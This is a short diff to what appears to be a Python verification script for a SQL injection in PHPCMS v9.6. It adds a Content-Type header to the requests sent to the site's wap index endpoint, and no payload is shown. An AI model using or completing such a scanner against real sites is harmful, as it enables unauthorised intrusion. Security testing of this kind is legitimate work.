@@ -17,6 +17,7 @@ class phpcms_v96_sqli_BaseVerify:
 
     def run(self):
         headers = {
+            "Content-Type":"application/x-www-form-urlencoded", 
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
